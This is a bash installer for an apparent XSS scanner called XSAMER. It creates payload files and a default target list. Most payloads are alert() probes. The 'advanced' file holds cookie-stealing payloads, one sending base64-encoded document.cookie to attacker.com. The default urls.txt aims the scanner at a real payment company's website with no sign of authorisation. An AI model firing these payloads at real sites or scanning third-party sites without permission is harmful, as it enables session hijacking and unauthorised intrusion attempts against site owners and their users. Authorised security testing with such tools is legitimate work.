#!/bin/bash
echo "🚀 Installing XSAMER XSS Scanner..."

# Install Python dependencies
pip3 install requests

# Make the script executable
chmod +x xss_scanner.py

# Create symbolic link for easy access with xsamer command
sudo ln -sf $(pwd)/xss_scanner.py /usr/local/bin/xsamer

# Create necessary directories
mkdir -p payloads

# Create sample payload files if they don't exist
if [ ! -f "payloads/basic_xss.txt" ]; then
    cat > payloads/basic_xss.txt << 'EOF'
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert('XSS')
<body onload=alert('XSS')>
EOF
    echo "[+] Created basic_xss.txt"
fi

if [ ! -f "payloads/advanced_xss.txt" ]; then
    cat > payloads/advanced_xss.txt << 'EOF'
<script>fetch('/steal?cookie='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+btoa(document.cookie))">
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
EOF
    echo "[+] Created advanced_xss.txt"
fi

if [ ! -f "payloads/dom_xss.txt" ]; then
    cat > payloads/dom_xss.txt << 'EOF'
#<img src=x onerror=alert(1)>
javascript:alert('DOM-XSS')
#" onmouseover="alert(1)
EOF
    echo "[+] Created dom_xss.txt"
fi

# Create sample URLs file if it doesn't exist
if [ ! -f "urls.txt" ]; then
    cat > urls.txt << 'EOF'
https://midtrans.com
https://midtrans.com/demo
https://midtrans.com/pricing
# Add more URLs here, one per line
EOF
    echo "[+] Created urls.txt"
fi

echo ""
echo "✅ XSAMER Installation Completed!"
echo ""
echo "Usage examples:"
echo "  xsamer -u https://example.com              # Scan single URL with all payloads"
echo "  xsamer -l urls.txt                         # Scan URLs from file with all payloads"
echo "  xsamer -u https://example.com -xss         # Explicitly use all payloads"
echo "  xsamer -u https://example.com -c basic_xss # Use specific category"
echo "  xsamer -u https://example.com -p id page   # Test specific parameters"
echo "  xsamer -u https://example.com -m GET POST  # Test specific methods"
echo "  xsamer --show                              # Show all payloads"
echo "  xsamer --import-payloads new_payloads.txt  # Import new payloads"
echo ""
echo "The scanner will automatically use all payload files in the 'payloads' directory"
